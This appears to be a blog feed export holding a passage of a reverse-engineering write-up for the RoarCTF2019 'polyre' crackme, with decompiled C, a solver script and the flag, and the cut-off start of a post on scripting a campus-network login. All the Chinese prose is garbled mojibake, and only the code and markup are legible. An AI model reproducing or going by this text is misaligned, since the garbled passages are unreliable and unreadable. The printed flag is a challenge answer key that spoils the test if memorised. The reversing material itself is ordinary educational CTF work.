ä¸ºdword_603058è¿™ä¸ªå…¨å±€å˜é‡æ˜¯åœ¨bssæ®µä¸Šçš„ï¼Œbssæ®µä¸Šä¸ºæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œæ‰€ä»¥å®ƒå°±æ˜¯0ã€‚è€Œä¸”æŸ¥ä¸€ä¸‹å®ƒçš„äº¤å‰å¼•ç”¨è¡¨ä¹Ÿä¼šå‘ç°ä¸å®ƒç›¸å…³çš„æŒ‡ä»¤éƒ½æ˜¯ä½œä¸ºæºæ“ä½œæ•°è€Œéç›®çš„æ“ä½œæ•°ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰å–å®ƒåœ°å€åšæŸäº›æ“ä½œï¼Œåœ¨æ­¤åŸºç¡€ä¹‹ä¸Šæˆ‘ä»¬åŸºæœ¬å¯ä»¥è®¤ä¸ºå®ƒå°±æ˜¯ä¸å˜çš„ã€‚</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/5.png" alt="5"></p><p>æ‰€ä»¥è¿™å»äº†æ··æ·†ä¹‹åè¿˜æœ‰ä¸€ç™¾å¤šè¡Œçš„ä»£ç å…¶å®æ˜¯ä»–è‡ªå·±æ‰‹åŠ¨ç–¯ç‹‚åŠ çš„æ··æ·†ã€‚æ‰€ä»¥è¿™é‡Œç›´æ¥æŠŠæ‰€æœ‰çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">do</span></span></span><br><span class="line"><span class="function">    xxx</span></span><br><span class="line"><span class="function"><span class="title">while</span> <span class="params">( dword_603058 &gt;= <span class="number">10</span> &amp;&amp; ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span></span></span><br></pre></td></tr></table></figure><p>å…¨éƒ¨æ›¿æ¢æˆxxxå°±å¥½äº†ï¼Œå› ä¸ºå®ƒåªæ‰§è¡Œä¸€æ¬¡å°±é€€å‡ºäº†ã€‚</p><p>æ­¤å¤–è¿˜æœ‰ä¸€äº›æ°¸ä¸º1çš„è¡¨è¾¾å¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_603058 &lt; <span class="number">10</span> || ((((_BYTE)dword_603054 - <span class="number">1</span>) * (_BYTE)dword_603054) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µä¸‹æˆ‘æˆ‘ä»¬ç›´æ¥æŠŠwhileå¾ªç¯å»äº†ï¼Œç„¶åæŠŠè¿™ä¸ªè¯­å¥ä¹‹ååœ¨whileå¾ªç¯è¯­å¥å†…çš„æ‰€æœ‰è¯­å¥éƒ½åˆ äº†ã€‚</p><p>ç„¶åå¾—åˆ°äº†ä»¥ä¸‹çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="keyword">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="keyword">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v11);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">//è¾“å…¥éƒ¨åˆ†ï¼Œç¢°åˆ°\næˆªæ­¢</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v6;</span><br><span class="line">    v13 = v12 &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v13 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[v6];</span><br><span class="line">    v15 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v15 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[v6];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = v6 + <span class="number">1</span>;</span><br><span class="line">    v6 = v17;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = i;</span><br><span class="line">    v19 = v18 &lt; <span class="number">6</span>;<span class="comment">//è¿™é‡Œå¯ä»¥çœ‹å‡ºåªæœ‰6ç»„</span></span><br><span class="line">    <span class="keyword">if</span> ( !v19 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v20 = s;</span><br><span class="line">    v4 = *(_QWORD *)&amp;v20[<span class="number">8</span> * i];<span class="comment">//è½¬ä¸ºäº†QWORDï¼Œæ¯ç»„å…«ä¸ªå­—èŠ‚</span></span><br><span class="line">    v7 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = v7;</span><br><span class="line">      v22 = v21 &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v22 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        v28 = <span class="number">2</span> * v27;</span><br><span class="line">        v4 = v28;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        v26 = v25;</span><br><span class="line">        v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = v7;</span><br><span class="line">      v7 = v29 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * i;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * i];</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    v32 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®æœ€åçœ‹æ¥ä¹Ÿå°±æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²åˆ†ä¸º6ç»„ï¼Œæ¯ç»„å…«ä¸ªå­—èŠ‚ã€‚ç„¶åä½œä¸ºlong long ç±»å‹è¿›è¡Œ64æ¬¡å˜æ¢ã€‚</p><p>ä¸»è¦å˜æ¢é€»è¾‘å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    v27 = v4;</span><br><span class="line">    v28 = <span class="number">2</span> * v27;</span><br><span class="line">    v4 = v28;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v25 = <span class="number">2</span> * v4;</span><br><span class="line">    v26 = v25;</span><br><span class="line">    v4 = v26 ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå¤§äº0åˆ™ç›´æ¥*2ï¼Œå¦åˆ™å†å¼‚æˆ–ä¸€ä¸ª0xB0004B7679FA26B3LLã€‚</p><p>ç„¶åæœ€åè·Ÿunk_402170åšä¸€ä¸ªmemcmpï¼Œé‚£ä¹ˆå°±å·²çŸ¥ç»“æœé€†å‘è¾“å…¥äº†ã€‚ä¸»è¦æˆ‘ä»¬éœ€è¦æ€ä¹ˆåˆ¤æ–­å®ƒæ˜¯å¦&gt;0å‘¢ï¼Œå…¶å®å¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚æœ&gt;0å°±å•çº¯*2äº†ï¼Œå¦åˆ™è¿˜ä¼šå¼‚æˆ–ä¸€ä¸ªå¥‡æ•°ï¼Œé‚£ä¹ˆå°±ä»æœ€ä½ä½çš„å¥‡å¶å…¥æ‰‹ï¼Œå¦‚æœæ˜¯å¶æ•°åˆ™/2ï¼Œå¦‚æœä¸æ˜¯é‚£ä¹ˆå°±å…ˆå¼‚æˆ–å†/2å°±å¥½äº†ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œè´Ÿæ•°/2å¹¶ä¸èƒ½å•çº¯å³ç§»ä¸€ä½ï¼Œè¿˜è¦å†é«˜ä½æ·»1æ‰èƒ½ä¿è¯æ˜¯è´Ÿæ•°/2ã€‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>æ®æ­¤å†™å‡ºè„šæœ¬</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> s[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x96</span>, <span class="number">0x62</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x6D</span>, <span class="number">0xF2</span>, <span class="number">0x8F</span>, <span class="number">0xBC</span>, </span><br><span class="line">  <span class="number">0x16</span>, <span class="number">0xEE</span>, <span class="number">0x30</span>, <span class="number">0x05</span>, <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x52</span>, </span><br><span class="line">  <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x5F</span>, <span class="number">0x93</span>, <span class="number">0xEA</span>, <span class="number">0xB5</span>, <span class="number">0xC0</span>, <span class="number">0x4D</span>, </span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x53</span>, <span class="number">0xD8</span>, <span class="number">0xAF</span>, <span class="number">0x90</span>, <span class="number">0x2B</span>, <span class="number">0x34</span>, </span><br><span class="line">  <span class="number">0x81</span>, <span class="number">0x36</span>, <span class="number">0x2C</span>, <span class="number">0xAA</span>, <span class="number">0xBC</span>, <span class="number">0x0E</span>, <span class="number">0x25</span>, <span class="number">0x8B</span>, </span><br><span class="line">  <span class="number">0xE4</span>, <span class="number">0x8A</span>, <span class="number">0xC6</span>, <span class="number">0xA2</span>, <span class="number">0x81</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x55</span>, </span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> key=<span class="number">0xB0004B7679FA26B3</span>uLL;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *p=(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)s;</span><br><span class="line">    <span class="keyword">int</span> iter=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(iter&lt;<span class="number">6</span>)&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k=*p;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k%<span class="number">2</span>)&#123;</span><br><span class="line">                k^=key;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">                k |= <span class="number">0x8000000000000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                k/=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">8</span>;j++)&#123;</span><br><span class="line">            write(<span class="number">1</span>,((<span class="keyword">char</span> *)&amp; k)+j,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        p++;</span><br><span class="line">        iter++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h2><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/6.png" alt="6"></p><p>flag:<code>flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ ¡å›­ç½‘æ¨¡æ‹Ÿç™»å½•</title>
      <link href="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
      <url>/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>å­¦æ ¡æ›´æ–°äº†æ ¡å›­ç½‘ä¹‹åï¼Œç”¨çš„å®½å¸¦å°±éœ€è¦æ¯å¤©æ—©ä¸Šè¿›è¡Œä¸€éç½‘é¡µç™»å½•æ‰èƒ½æœ‰ç½‘ï¼Œéå¸¸çš„éº»çƒ¦ï¼Œæˆ‘å°±èŒç”Ÿå‡ºäº†æƒ³å†™ä¸ªæ¨¡æ‹Ÿç™»å½•çš„è„šæœ¬çš„æƒ³æ³•ã€‚</p><span id="more"></span><h2 id="æŠ“åŒ…è·å¾—è¯·æ±‚æ–¹å¼"><a href="#æŠ“åŒ…è·å¾—è¯·æ±‚æ–¹å¼" class="headerlink" title="æŠ“åŒ…è·å¾—è¯·æ±‚æ–¹å¼"></a>æŠ“åŒ…è·å¾—è¯·æ±‚æ–¹å¼</h2><p>è¿™é‡Œæˆ‘ç”¨wiresharkæŠ“åŒ…ï¼ŒåªæŠ“ä»ç™»å½•åˆ°ç™»å½•æˆåŠŸè¿™ä¸ªæ—¶é—´æ®µçš„åŒ…ï¼Œè¿™é‡Œä¸»è¦åˆ†ææˆ‘ä»¬å‘é€çš„httpçš„æµé‡åŒ…ã€‚</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/4.png" alt="1"></p><p>å¯ä»¥å‘ç°ä¸»è¦æœ‰ä¸¤ä¸ªæµé‡åŒ…å‡ºç°äº†usernameå­—æ®µï¼Œé‚£ä¹ˆä¸»è¦åˆ†æè¿™ä¸¤ä¸ªåŒ…å†…å®¹çš„å‚æ•°ã€‚ç¬¬ä¸€ä¸ªæµé‡åŒ…å†…å®¹å¦‚ä¸‹</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/5.png" alt="1"></p><p>è¯·æ±‚apiä¸º<code>http://10.110.74.99/cgi-bin/get_challenge</code></p><p>ä¸»è¦æœ‰å››ä¸ªå‚æ•°ï¼Œ<code>callback</code>ï¼Œ<code>username</code>ï¼Œ<code>ip</code>ï¼Œå’Œ<code>_</code>ã€‚callbackå‚æ•°ä¸å¤ªç¡®å®šï¼Œä½†æ˜¯å¯ä»¥ç¡®å®šusernameæ˜¯è‡ªå·±ç™»å½•æ ¡å›­ç½‘çš„è´¦å·ï¼Œipå°±æ˜¯è‡ªå·±æœ¬æœºåœ¨è¿™ä¸ªå±€åŸŸç½‘ä¸‹çš„ipï¼Œè€Œ<code>_</code>å¾ˆæ˜æ˜¾å°±æ˜¯æ—¶é—´æˆ³ã€‚è€Œå¯ä»¥çœ‹åˆ°call_backåé¢ä¹Ÿæœ‰ä¸€ä¸ªç±»ä¼¼æ—¶é—´æˆ³çš„å‚æ•°ã€‚è¿™ä¸ªæš‚ä¸”ä¸ç¡®å®šï¼Œä½†æ˜¯åé¢åå¤æŠ“åŒ…å¯ä»¥å‘ç°ï¼Œè¿™ä¸ªå‚æ•°å°±æ˜¯å›ºå®šçš„ã€‚è‡³äºæœ¬æ¬¡è¯·æ±‚æ˜¯è¿”å›äº†ä»€ä¹ˆæˆ‘ä»¬å¯ä»¥ç…§ç€å‚æ•°æ‰“è¿›å»çœ‹çœ‹è¿”å›äº†ä»€ä¹ˆæ•°æ®ï¼Œæœ¬äººå¾ˆèœï¼Œä¸æ˜¯æ‰“webçš„ï¼Œä¸ä¼šç”¨burpsuiteåªèƒ½ç”¨è¿™ç§åŠæ³•äº†ã€‚</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/6.png" alt="1"></p><p>å¯ä»¥å‘ç°è¿”å›äº†ä¸€ä¸²jsonæ•°æ®ï¼Œé‡Œé¢ä¸»è¦æœ‰ä¸€ä¸ªchallengeå­—æ®µï¼Œæ„Ÿè§‰æ˜¯ä¸€ä¸ªç±»ä¼¼tokençš„ä¸œè¥¿ï¼Œå…¶å®ƒçš„å°±æ²¡ä»€ä¹ˆäº†ï¼Œå®¢æˆ·ç«¯ipï¼ŒæœåŠ¡ç«¯ipï¼Œè¯·æ±‚çŠ¶æ€ï¼Œäº§å“ç‰ˆæœ¬å’Œæ—¶é—´æˆ³ã€‚è€Œè¿™é‡Œä¹Ÿæ–¹ä¾¿äº†æˆ‘ä»¬ï¼Œå¯ä»¥ç›´æ¥ä»è¿™é‡Œè·å–è‡ªå·±çš„ipäº†ï¼Œä½†æ˜¯ç½‘é¡µç«¯åšè¿™ä¸ªä¼°è®¡ä¸»è¦è¿˜æ˜¯ä¸ºäº†è¿™ä¸ªtokenã€‚ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰å¯†ç å­—æ®µï¼Œè¿˜æ²¡æœ‰ç™»å½•è¯·æ±‚ã€‚</p><p>å‰©ä¸‹çš„å°±çœ‹çœ‹å¦ä¸€ä¸ªæµé‡åŒ…</p><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/7.png" alt="1"></p><p>ç¬¬äºŒä¸ªæµé‡åŒ…è¯·æ±‚çš„apiä¸º<code>http://10.110.74.99/cgi-bin/srun_portal</code></p><p>è¯·æ±‚çš„å‚æ•°å¾ˆå¤šï¼Œé¦–å…ˆä¾æ—§æ˜¯callbackï¼Œè·Ÿä¹‹å‰ä¸€æ ·ï¼Œactionå‚æ•°ä¼°è®¡æ˜¯æ ‡è¯†æœ¬æ¬¡è¯·æ±‚ç±»å‹ä¸ºç™»å½•ï¼Œç¬¬å››ä¸ªå‚æ•°å¼€å§‹å‡ºç°äº†å¯†ç å­—æ®µï¼Œè€Œè¿™ä¸ªå¾ˆæ˜æ˜¾è¿›è¡Œäº†md5åŠ å¯†ï¼ŒosæŒ‡ç¤ºæ“ä½œç³»ç»Ÿç±»å‹ï¼Œnameä¸ºå¤§æ¦‚ä¹Ÿæ˜¯æ“ä½œç³»ç»Ÿåç§°çš„æ„æ€ã€‚è¿˜æœ‰ä¸€ä¸ªdouble_stackï¼Œè™½ç„¶ä¸æ‡‚ä½†æ˜¯åå¤æŠ“åŒ…å‘ç°è¿™ä¸ªå‚æ•°ä¹Ÿæ˜¯æ’å®šä¸å˜æ˜¯0ï¼Œæ‰€ä»¥ä¹Ÿä¸ç”¨å»ç†è§£å®ƒçš„æ„æ€äº†ã€‚chksumå‚æ•°æ˜¯ä¸€ä¸²å¯èƒ½ç»è¿‡æŸç§hashç®—æ³•å¾—åˆ°çš„å€¼ã€‚infoåŒæ ·å¦‚æ­¤ï¼Œåªæ˜¯å®ƒæ‹¬èµ·æ¥çš„è¿™ä¸ªåŠ å¯†ç®—æ³•ç€å®æ²¡å¬è¿‡ã€‚ç„¶åå‰©ä¸‹çš„å‚æ•°éƒ½æ˜¯å›ºå®šçš„å°±æ²¡å¿…è¦å»çº ç»“äº†ã€‚</p><p>æ‰€ä»¥æƒ³è¦æˆåŠŸæ¨¡æ‹Ÿç™»å½•ï¼Œå¿…é¡»å¾—åˆ°è¿™äº›å‚æ•°ï¼Œéœ€è¦è®¡ç®—çš„å°±åªæœ‰passwordï¼Œchksumï¼Œinfoä¸‰ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå»åˆ†æä¸€ä¸‹ç½‘é¡µæºç çœ‹çœ‹è¿™ä¸‰ä¸ªå‚æ•°æ˜¯æ€ä¹ˆå¾—åˆ°çš„ã€‚</p><h2 id="åˆ†æç½‘é¡µjs"><a href="#åˆ†æç½‘é¡µjs" class="headerlink" title="åˆ†æç½‘é¡µjs"></a>åˆ†æç½‘é¡µjs</h2><p>F12æŸ¥çœ‹ï¼Œä¸»è¦å¯»æ‰¾ç™»å½•æŒ‰é’®ç‚¹å‡»ä¹‹åå¹²å¹²äº†ä»€ä¹ˆ</p><h3 id="passwordåŠ å¯†"><a href="#passwordåŠ å¯†" class="headerlink" title="passwordåŠ å¯†"></a>passwordåŠ å¯†</h3><p><img src="/2021/12/08/%E6%A0%A1%E5%9B%AD%E7%BD%91%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/1.png" alt="1"></p><p>å¯ä»¥çœ‹åˆ°åªå¯¹å‰ç«¯è¿›è¡Œäº†åŸºæœ¬çš„æ 